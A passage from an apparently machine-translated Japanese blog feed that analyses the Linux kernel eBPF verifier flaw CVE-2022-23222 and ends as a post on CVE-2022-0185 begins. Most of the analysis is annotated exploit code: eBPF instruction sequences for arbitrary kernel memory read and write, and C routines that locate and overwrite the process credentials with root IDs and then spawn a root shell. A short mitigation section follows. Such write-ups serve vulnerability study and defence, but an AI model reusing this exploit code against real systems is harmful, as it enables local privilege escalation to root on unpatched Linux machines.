class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.</span><br><span class="line"> * Caller should also handle BPF_MOV case separately.</span><br><span class="line"> * If we return -EACCES, caller may want to try again treating pointer as a</span><br><span class="line"> * scalar.  So we only emit a diagnostic if !env-&gt;allow_ptr_leaks.</span><br><span class="line"> */</span><br><span class="line">static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line">                   struct bpf_insn *insn,</span><br><span class="line">                   const struct bpf_reg_state *ptr_reg,</span><br><span class="line">                   const struct bpf_reg_state *off_reg)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    switch (ptr_reg-&gt;type) &#123;</span><br><span class="line">    case PTR_TO_MAP_VALUE_OR_NULL:</span><br><span class="line">        verbose(env, &quot;R%d pointer arithmetic on %s prohibited, null-check it first\n&quot;,</span><br><span class="line">            dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">        return -EACCES;</span><br><span class="line">    case CONST_PTR_TO_MAP:</span><br><span class="line">        /* smin_val represents the known value */</span><br><span class="line">        if (known &amp;&amp; smin_val == 0 &amp;&amp; opcode == BPF_ADD)</span><br><span class="line">            break;</span><br><span class="line">        fallthrough;</span><br><span class="line">    case PTR_TO_PACKET_END:</span><br><span class="line">    case PTR_TO_SOCKET:</span><br><span class="line">    case PTR_TO_SOCKET_OR_NULL:</span><br><span class="line">    case PTR_TO_SOCK_COMMON:</span><br><span class="line">    case PTR_TO_SOCK_COMMON_OR_NULL:</span><br><span class="line">    case PTR_TO_TCP_SOCK:</span><br><span class="line">    case PTR_TO_TCP_SOCK_OR_NULL:</span><br><span class="line">    case PTR_TO_XDP_SOCK:</span><br><span class="line">        verbose(env, &quot;R%d pointer arithmetic on %s prohibited\n&quot;,</span><br><span class="line">            dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">        return -EACCES;</span><br><span class="line">    default:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>関数adjust_ptr_min_max_vals()は、eBPFが加算と減算のためのポインタを検証するために使用する関数である。 このコードでは、switch を使用して、さまざまな “<em>_OR_NULL” 型など、加算や減算をサポートしないポインタ型をフィルタリングしています。 しかし、このコードには、多くの型判定が欠けています。 つまり、「</em>_OR_NULL」型の一部を含む、これらの欠落した型を足したり引いたりすることができるのです。</p><h5 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h5><p>公開されたPocは、以下のように非常に標準化された方法で書かれており、活用の仕組みが非常に明確になっています。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phase_t phases[] = &#123;</span><br><span class="line">    &#123; .name = &quot;create bpf map(s)&quot;, .func = create_bpf_maps &#125;,</span><br><span class="line">    &#123; .name = &quot;do some leak&quot;, .func = do_leak &#125;,</span><br><span class="line">    &#123; .name = &quot;prepare arbitrary rw&quot;, .func = prepare_arbitrary_rw &#125;,</span><br><span class="line">    &#123; .name = &quot;spawn processes&quot;, .func = spawn_processes &#125;,</span><br><span class="line">    &#123; .name = &quot;find cred (slow)&quot;, .func = find_cred &#125;,</span><br><span class="line">    &#123; .name = &quot;overwrite cred&quot;, .func = overwrite_cred &#125;,</span><br><span class="line">    &#123; .name = &quot;spawn root shell&quot;, .func = spawn_root_shell &#125;,</span><br><span class="line">    &#123; .name = &quot;clean up the mess&quot;, .func = clean_up , .ignore_error = 1 &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>おおよその流れは以下の通りです。<br>まずbpfマップを構築し、array_mapのアドレスをリークする脆弱性を利用し、任意のメモリアドレスへの読み書きを行うオリジナル言語を構築します。<br>その直後、lifting用のプロセスが作成され、task_struct構造体が検索され、task_structのuid, gid, euid, egidが上書きされ、rootシェルが作成されます。</p><p>その主要部分を注釈付きで詳しく見てみると、次のようになる。</p><p>カーネルの任意のメモリ読み出しプロト。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// r9 = r1</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">      /*</span><br><span class="line">      *bpfプログラムのパラメータは、r1レジスタに置かれる</span><br><span class="line">      *このパラメータは、実質的にポインタの配列である</span><br><span class="line">      *ここで，最初の2つの要素は読み出すべきメモリアドレスである</span><br><span class="line">      *ここでは、パラメータ・アドレスがr9レジスタに保存されています。</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      // r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span><br><span class="line">      BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd),</span><br><span class="line">      BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),</span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span><br><span class="line">      /*</span><br><span class="line">      *bpf_map[ctx-&gt;comm_fd] への参照を取得する。</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      // if (r0 == NULL) exit(1)</span><br><span class="line">      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_0, 1),</span><br><span class="line">      BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">      // r8 = r0</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),</span><br><span class="line">      /*</span><br><span class="line">      *bpf_map[ctx-&gt;comm_fd]への参照をr8レジスタに保存する。</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      // r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span><br><span class="line">      BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd),</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_3, 0x00),</span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),</span><br><span class="line">      /*</span><br><span class="line">      *bpf_ringbuf_reserveの呼び出し</span><br><span class="line">      *NULLでなければならない*_OR_NULLポインタを構築する。</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),</span><br><span class="line">      /*</span><br><span class="line">      *r0 の *_OR_NULL ポインタを r1 に保存する</span><br><span class="line">      *この時点ではNULL判定は行われないため</span><br><span class="line">      *r0もr1も計算してはいけない。</span><br><span class="line">      *脆弱性を利用してr1+1を実行する</span><br><span class="line">      *このときr0==0, r1=1</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      // if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span><br><span class="line">      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_2, 1),</span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_0, 2),</span><br><span class="line">      BPF_EXIT_INSN(),</span><br><span class="line">      /*</span><br><span class="line">      *NULL判定を行う</span><br><span class="line">      *結果は r0 == NULL でなければならない。</span><br><span class="line">      *しかし、この時点では r1 == 1</span><br><span class="line">      */</span><br><span class="line">      // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.</span><br><span class="line"></span><br><span class="line">      // r7 = (r1 + 1) * 8</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),</span><br><span class="line">      BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 8),</span><br><span class="line">      /*</span><br><span class="line">      *このとき、r7 == 16</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      // verifier believe r7 = 8, but r7 = 16 actually.</span><br><span class="line"></span><br><span class="line">      // store the array pointer</span><br><span class="line">      BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -8),// *(r10 - 8) = reg8 = bpf_map[ctx-&gt;comm_fd]</span><br><span class="line">      /*</span><br><span class="line">      *bpf_map[ctx-&gt;comm_fd] を r10 - 8 に格納する。</span><br><span class="line">      */</span><br><span class="line">      /*</span><br><span class="line">      *この時点でのスタック構成は以下の通りです。</span><br><span class="line">      *|r10+08|                     |</span><br><span class="line">      *| r10  |                     |</span><br><span class="line">      *|r10-08|bpf_map[ctx-&gt;comm_fd]|</span><br><span class="line">      *|r10-16|                     |</span><br><span class="line">      */</span><br><span class="line">      // overwrite array pointer on stack</span><br><span class="line"></span><br><span class="line">      // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_2, 0),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),//BPF_REG_3=BPF_REG_10=BPF_REG_8</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),//BPF_REG_3=BPF_REG_8-16</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),//BPF_REG_4=BPF_REG_7==16</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_5, 1),//(ptrs,0,r10-16,16,1)</span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),</span><br><span class="line">      /*</span><br><span class="line">      *r0 = bpf_skb_load_bytes_relative(&amp;addr,0,r10-16,16,1)</span><br><span class="line">      *実行が完了すると、r10-8 の内容が上書きされます。</span><br><span class="line">      *この時点でのスタック構成は以下の通りです。</span><br><span class="line">      *|r10+08|       |</span><br><span class="line">      *| r10  |       |</span><br><span class="line">      *|r10-08|addr[1]|</span><br><span class="line">      *|r10-16|addr[0]|</span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line">      // fetch our arbitrary address pointer</span><br><span class="line">      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),</span><br><span class="line">      /*</span><br><span class="line">      *r6=addr[1]</span><br><span class="line">      *このとき、r6が読み出すべきアドレスとなる</span><br><span class="line">      */</span><br><span class="line">      BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),</span><br><span class="line">      /*</span><br><span class="line">      *r0=*addr[1]</span><br><span class="line">      *このとき、r0は読み出すアドレスの内容です</span><br><span class="line">      */</span><br><span class="line">      BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),</span><br><span class="line">      /*</span><br><span class="line">      *結果をr8が指すメモリに保存する</span><br><span class="line">      *即bpf_map[ctx-&gt;comm_fd]</span><br><span class="line">      */</span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_0, 0),</span><br><span class="line">      BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure><p>カーネル任意メモリ書き込みプロト言語。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">*原語と同じ部分はここでは省略しています</span><br><span class="line">*この時点でのスタック構成は以下の通りです。</span><br><span class="line">*|r10+08|       |</span><br><span class="line">*| r10  |       |</span><br><span class="line">*|r10-08|addr[1]|</span><br><span class="line">*|r10-16|addr[0]|</span><br><span class="line">*/</span><br><span class="line">// fetch our arbitrary address pointer</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),</span><br><span class="line">/*</span><br><span class="line">*r6=addr[1]</span><br><span class="line">*このとき、r6が書き込むべきアドレスになります</span><br><span class="line">*/</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),</span><br><span class="line">/*</span><br><span class="line">*r0=(qwords)bpf_map[ctx-&gt;comm_fd][0]</span><br><span class="line">*/</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 8),</span><br><span class="line">/*</span><br><span class="line">*r0=(qwords)bpf_map[ctx-&gt;comm_fd][1]</span><br><span class="line">*/</span><br><span class="line">// if (r0 == 0) &#123; *(u64*)r6 = r1 &#125;</span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),</span><br><span class="line">BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 0),</span><br><span class="line">BPF_JMP_IMM(BPF_JA, 0, 0, 1),</span><br><span class="line">// else &#123; *(u32*)r6 = r1 &#125;</span><br><span class="line">BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_1, 0),</span><br><span class="line">/*</span><br><span class="line">*長さを決定した後、指定されたアドレスに内容を書き込む</span><br><span class="line">*/</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, 0),</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure><p>権利が解除されるまでの過程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int spawn_processes(context_t *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    for (int i = 0; i &lt; PROC_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pid_t child = fork();</span><br><span class="line">        if (child == 0) &#123;</span><br><span class="line">            if (prctl(PR_SET_NAME, __ID__, 0, 0, 0) != 0) &#123;</span><br><span class="line">                WARNF(&quot;Could not set name&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            uid_t old = getuid();</span><br><span class="line">            kill(getpid(), SIGSTOP);</span><br><span class="line">            uid_t uid = getuid();</span><br><span class="line">            if (uid == 0 &amp;&amp; old != uid) &#123;</span><br><span class="line">                OKF(&quot;Enjoy root!&quot;);</span><br><span class="line">                system(&quot;/bin/sh&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            exit(uid);</span><br><span class="line">        &#125;</span><br><span class="line">        if (child &lt; 0) &#123;</span><br><span class="line">            return child;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;processes[i] = child;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>まず子プロセスをフォークし、子プロセスの中でスレッド名を特定の文字列に設定し、uidを記録した後、自分自身をサスペンドします。 子プロセスは起床を待った後、現在の uid をチェックし、起床に成功した場合はシェルを実行する。<br>親プロセスは子のpidを記録した後もfind_credを実行し続ける。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int find_cred(context_t *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    for (int i = 0; i &lt; PAGE_SIZE*PAGE_SIZE ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        u64 val = 0;</span><br><span class="line">        kaddr_t addr = ctx-&gt;array_map + PAGE_SIZE + i*0x8;</span><br><span class="line">        if (arbitrary_read(ctx, addr, &amp;val, BPF_DW) != 0) &#123;</span><br><span class="line">            WARNF(&quot;Could not read kernel address %p&quot;, addr);</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        if (memcmp(&amp;val, __ID__, sizeof(val)) == 0) &#123;</span><br><span class="line">            kaddr_t cred_from_task = addr - 0x10;</span><br><span class="line">            if (arbitrary_read(ctx, cred_from_task + 8, &amp;val, BPF_DW) != 0) &#123;</span><br><span class="line">                WARNF(&quot;Could not read kernel address %p + 8&quot;, cred_from_task);</span><br><span class="line">                return -1;</span><br><span class="line">            &#125;</span><br><span class="line">            if (val == 0 &amp;&amp; arbitrary_read(ctx, cred_from_task, &amp;val, BPF_DW) != 0) &#123;</span><br><span class="line">                WARNF(&quot;Could not read kernel address %p + 0&quot;, cred_from_task);</span><br><span class="line">                return -1;</span><br><span class="line">            &#125;</span><br><span class="line">            if (val != 0) &#123;</span><br><span class="line">                ctx-&gt;cred = (kaddr_t)val;</span><br><span class="line">                DEBUGF(&quot;task struct ~ %p&quot;, cred_from_task);</span><br><span class="line">                DEBUGF(&quot;cred @ %p&quot;, ctx-&gt;cred);</span><br><span class="line">                DEBUGF(&quot;cred is %d&quot;, &amp;(ctx-&gt;cred));</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>親プロセスは、find_cred関数でブルートフォースメモリー検索を行い、カーネル内のtask_structのキーアドレスを探そうとして、子プロセスが設定したスレッド名を検索します。 キーアドレスが見つかると、次にoverwrite_cred関数が呼ばれ、task_structのuid、gid、euid、egidを上書きし、権利の解放を可能にする。 権限付与が完了すると、子プロセスにウェイクアップシグナルが送られ、子プロセスが実行を続け、root権限を持つシェルが生成されるまで待ちます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int overwrite_cred(context_t *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    if (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_uid_from_cred, 0, BPF_W) != 0) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_gid_from_cred, 0, BPF_W) != 0) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_euid_from_cred, 0, BPF_W) != 0) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (arbitrary_write(ctx, ctx-&gt;cred + OFFSET_egid_from_cred, 0, BPF_W) != 0) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int spawn_root_shell(context_t *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    for (int i = 0; i &lt; PROC_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        kill(ctx-&gt;processes[i], SIGCONT);</span><br><span class="line">    &#125;</span><br><span class="line">    while(wait(NULL) &gt; 0);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="0x04-概要"><a href="#0x04-概要" class="headerlink" title="0x04 概要"></a>0x04 概要</h5><p>この脆弱性は、基本的にeBPF Validatorによるフィルタリングが不十分なために、 Validatorのロジックと実際の実行との間に矛盾が生じ、その結果、 Validatorのセキュリティチェックが破れ、最終的にカーネル内で任意のメモリの 読み書きができてしまうというものです。 公開されているexp方式による電力持ち上げ以外にも、脆弱性を利用して実行するカーネルシェルコードを構築することも可能です。<br>この点では、脆弱性は深刻ですが、悪用には非特権ユーザーにeBPFコードの実行を許可する必要があり、ほとんどのディストリビューションではデフォルトで有効になっていないため、結果的に脆弱性は限定的なものとなります。</p><h5 id="0x05-防范"><a href="#0x05-防范" class="headerlink" title="0x05 防范"></a>0x05 防范</h5><p>カーネルを安全なバージョンにアップグレードする<br>以下のコマンドで、非特権ユーザーのeBPFプログラムの実行を無効にします。</p><p>sudo sysctl kernel.unprivileged_bpf_disabled&#x3D;1</p><p><a href="https://tttang.com/archive/1628/#toc_0x00">https://tttang.com/archive/1628/#toc_0x00</a><br><a href="https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt">https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt</a><br><a href="https://github.com/tr3ee/CVE-2022-23222">https://github.com/tr3ee/CVE-2022-23222</a></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2022-0185</title>
      <link href="/2022/09/07/bin/linux/cve-2022-0185/"/>
      <url>/2022/09/07/bin/linux/cve-2022-0185/</url>
      
        <content type="html"><![CDATA[<h3 id="cve-2022-0185-新しいパイプ言語の思考と実践による解析とエクスプロイテーション"><a href="#cve-2022-0185-新しいパイプ言語の思考と実践による解析とエクスプロイテーション" class="headerlink" title="cve-2022-0185 新しいパイプ言語の思考と実践による解析とエクスプロイテーション"></a>cve-2022-0185 新しいパイプ言語の思考と実践による解析とエクスプロイテーション</h3><h4 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h4><p>関数 legacy_parse_param は、引数の長さのチェックサムが正しくないため、整数オーバーフローを引き起こし、ヒープバッファのオーバーフローを引き起こします。この関数は、Linux カーネルのファイルシステム関連関数を処理するために使用され、呼び出されるためには、以下の条件も満たされることが必要です。</p><ul><li>ユーザーが CAP_SYS_ADMIN 権限を持っている、または別のネームスペースにいる。 </li><li>Filesystem Context API をサポートしていないファイルシステムを開く (つまり、レガシーコードを呼び出す)<br>そのため、メモリ破壊によるローカルリフトやコンテナエスケープが発生します。</li></ul><h4 id="脆弱性"><a href="#脆弱性" class="headerlink" title="脆弱性"></a>脆弱性</h4><p>Linux kernel 5.10.6ベース</p><h5 id="脆弱性解析"><a href="#脆弱性解析" class="headerlink" title="脆弱性解析"></a>脆弱性解析</h5><p>本脆弱性は、legacy_parse_param 関数で発生します。</p><p>ctxはlegacy_dataというバッファをPAGE_SIZEというサイズで保持している。 ユーザーはキー値のペアを渡して、,[key]&#x3D;[value]というフォーマットを使って、長さ（533行）がOKかどうか判断した後、バッファの最後にデータを追加することができる。 しかし、533行目のlenとsizeはともに符号なしなので、sizeがPAGE_SIZE - 2より大きい場合、大きな正の数への整数オーバーフローが発生し、判定をバイパスしてヒープバッファがオーバーフローしてしまうことになるのです。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td 